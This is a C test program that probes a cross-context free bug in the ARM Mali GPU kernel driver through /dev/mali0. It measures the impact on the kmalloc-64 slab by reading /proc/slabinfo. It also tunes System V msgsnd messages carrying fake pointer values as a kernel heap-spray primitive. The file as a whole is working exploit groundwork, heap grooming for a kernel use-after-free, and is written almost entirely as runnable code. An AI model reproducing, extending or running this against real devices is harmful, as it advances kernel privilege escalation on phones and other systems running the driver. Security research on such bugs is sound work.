/*
 * xctx_slab.c — Cross-context free slab impact + msgsnd spray test
 * Determine if cross-context free returns objects to kmalloc-64 general pool
 * Test msgsnd as controlled heap spray primitive
 */
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <unistd.h>

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

struct uk_header { uint32_t id; uint32_t ret; };
static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    ioctl(fd, make_cmd(16), hb);
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    ioctl(fd, make_cmd(16), hb);
    return fd;
}

static uint64_t mali_alloc(int fd, uint32_t pages, uint32_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8) = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint32_t*)(buf + 32) = flags;
    if (ioctl(fd, make_cmd(56), buf) < 0) return 0;
    if (((struct uk_header*)buf)->id != 0) return 0;
    return *(uint64_t*)(buf + 40);
}

static int mali_free(int fd, uint64_t va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = va;
    return ioctl(fd, make_cmd(16), buf);
}

struct slab_entry { char name[64]; long active; long total; long objsize; };

static int read_slabinfo(struct slab_entry *entries, int max) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return 0;
    char line[512];
    (void)fgets(line, sizeof(line), f);
    (void)fgets(line, sizeof(line), f);
    int count = 0;
    while (fgets(line, sizeof(line), f) && count < max) {
        sscanf(line, "%63s %ld %ld %ld",
               entries[count].name, &entries[count].active,
               &entries[count].total, &entries[count].objsize);
        count++;
    }
    fclose(f);
    return count;
}

static long get_slab_active(const char *name) {
    struct slab_entry e[200];
    int n = read_slabinfo(e, 200);
    for (int i = 0; i < n; i++)
        if (strcmp(e[i].name, name) == 0)
            return e[i].active;
    return -1;
}

/* System V message queue payload targeting kmalloc-64 */
struct msgbuf_k64 {
    long mtype;         /* offset 0 in user struct, maps to msg_msg.m_type */
    char mtext[32];     /* offset 4, maps to msg_msg inline data at offset 24 */
    /* msg_msg header is 24 bytes, so total = 24+32 = 56 → kmalloc-64 */
};

int main(void) {
    printf("=== Cross-Context Free Slab Analysis ===\n");

    /* TEST 1: msgsnd availability and slab impact */
    printf("\n--- TEST 1: System V msgsnd test ---\n");
    {
        int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msqid < 0) {
            printf("[-] msgget failed: %s\n", strerror(errno));
        } else {
            printf("[+] msgget: msqid=%d\n", msqid);

            long before = get_slab_active("kmalloc-64");

            /* Send 200 messages targeting kmalloc-64 */
            int sent = 0;
            for (int i = 0; i < 200; i++) {
                struct msgbuf_k64 msg;
                msg.mtype = 1;
                memset(msg.mtext, 0x41 + (i & 0xF), sizeof(msg.mtext));
                /* Write a fake pointer at various offsets */
                *(uint32_t*)(msg.mtext + 0) = 0xDEADBEEF;  /* offset 24 in kmalloc-64 obj */
                *(uint32_t*)(msg.mtext + 4) = 0xCAFEBABE;  /* offset 28 */
                *(uint32_t*)(msg.mtext + 8) = 0x41414141;  /* offset 32 */
                if (msgsnd(msqid, &msg, sizeof(msg.mtext), IPC_NOWAIT) == 0)
                    sent++;
                else break;
            }
            printf("  Sent %d messages (data_len=%zu)\n", sent, sizeof(((struct msgbuf_k64*)0)->mtext));

            long after_send = get_slab_active("kmalloc-64");
            printf("  kmalloc-64: %ld → %ld (%+ld)\n", before, after_send, after_send - before);

            /* Verify recv works */
            struct msgbuf_k64 rmsg;
            if (msgrcv(msqid, &rmsg, sizeof(rmsg.mtext), 0, IPC_NOWAIT) >= 0) {
                printf("  Recv OK: mtype=%ld data[0..3]=0x%08x\n",
                       rmsg.mtype, *(uint32_t*)rmsg.mtext);
            }

            long after_recv1 = get_slab_active("kmalloc-64");
            printf("  After 1 recv: %ld (%+ld from send)\n", after_recv1, after_recv1 - after_send);

            /* Recv rest */
            while (msgrcv(msqid, &rmsg, sizeof(rmsg.mtext), 0, IPC_NOWAIT) >= 0);

            long after_recv_all = get_slab_active("kmalloc-64");
            printf("  After all recv: %ld (%+ld from before)\n",
                   after_recv_all, after_recv_all - before);

            msgctl(msqid, IPC_RMID, NULL);
        }
    }

    /* TEST 2: Cross-context free slab impact */
    printf("\n--- TEST 2: Cross-context free slab impact ---\n");
    {
        long baseline = get_slab_active("kmalloc-64");
        printf("  Baseline: %ld\n", baseline);

        /* Alloc in ctx1 */
        int ctx1 = mali_open_ctx();
        uint64_t vas[100];
        int count = 0;
        for (int i = 0; i < 100; i++) {
            vas[i] = mali_alloc(ctx1, 1, 0x0F);
            if (vas[i]) count++;
        }
        long after_alloc = get_slab_active("kmalloc-64");
        printf("  After %d allocs: %ld (%+ld)\n", count, after_alloc, after_alloc - baseline);

        /* Cross-context free from ctx2 */
        int ctx2 = mali_open_ctx();
        int freed = 0;
        for (int i = 0; i < count; i++) {
            if (mali_free(ctx2, vas[i]) == 0)
                freed++;
        }
        long after_xfree = get_slab_active("kmalloc-64");
        printf("  After %d cross-ctx frees: %ld (%+ld from alloc, %+ld from baseline)\n",
               freed, after_xfree, after_xfree - after_alloc, after_xfree - baseline);

        /* Now close ctx1 (stale references) */
        close(ctx1);
        long after_close1 = get_slab_active("kmalloc-64");
        printf("  After close ctx1: %ld (%+ld from baseline)\n",
               after_close1, after_close1 - baseline);

        close(ctx2);
        long after_close2 = get_slab_active("kmalloc-64");
        printf("  After close ctx2: %ld (%+ld from baseline)\n",
               after_close2, after_close2 - baseline);
    }

    /* TEST 3: Normal free slab impact (for comparison) */
    printf("\n--- TEST 3: Normal free slab impact ---\n");
    {
        long baseline = get_slab_active("kmalloc-64");

        int ctx1 = mali_open_ctx();
        uint64_t vas[100];
        int count = 0;
        for (int i = 0; i < 100; i++) {
            vas[i] = mali_alloc(ctx1, 1, 0x0F);
            if (vas[i]) count++;
        }
        long after_alloc = get_slab_active("kmalloc-64");
        printf("  After %d allocs: %ld (%+ld)\n", count, after_alloc, after_alloc - baseline);

        /* Normal free from same context */
        for (int i = 0; i < count; i++)
            mali_free(ctx1, vas[i]);

        long after_free = get_slab_active("kmalloc-64");
        printf("  After normal free: %ld (%+ld from alloc, %+ld from baseline)\n",
               after_free, after_free - after_alloc, after_free - baseline);

        close(ctx1);
        long after_close = get_slab_active("kmalloc-64");
        printf("  After close: %ld (%+ld from baseline)\n",
               after_close, after_close - baseline);
    }

    /* TEST 4: msgsnd with different sizes to find exact kmalloc-64 fit */
    printf("\n--- TEST 4: msgsnd size targeting ---\n");
    {
        /* msg_msg header on 32-bit ARM ≈ 24 bytes:
         * list_head (8) + m_type (4) + m_ts (4) + next (4) + security (4) = 24
         * Data follows inline.
         * For kmalloc-64: 64 - 24 = 40 bytes max data
         * For kmalloc-128: 128 - 24 = 104 bytes max data
         */
        int sizes[] = { 8, 16, 24, 32, 40, 48 };
        char *cache_names[] = { "kmalloc-64", "kmalloc-128", "kmalloc-192" };

        for (int si = 0; si < 6; si++) {
            int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
            if (msqid < 0) continue;

            long b64 = get_slab_active("kmalloc-64");
            long b128 = get_slab_active("kmalloc-128");

            struct { long mtype; char data[64]; } msg;
            msg.mtype = 1;
            memset(msg.data, 'A', 64);
            int sent = 0;
            for (int i = 0; i < 100; i++) {
                if (msgsnd(msqid, &msg, sizes[si], IPC_NOWAIT) == 0) sent++;
                else break;
            }

            long a64 = get_slab_active("kmalloc-64");
            long a128 = get_slab_active("kmalloc-128");

            printf("  data_len=%d: sent=%d  k64=%+ld  k128=%+ld\n",
                   sizes[si], sent, a64 - b64, a128 - b128);

            msgctl(msqid, IPC_RMID, NULL);
        }
    }

    printf("\n=== Done ===\n");
    return 0;
}
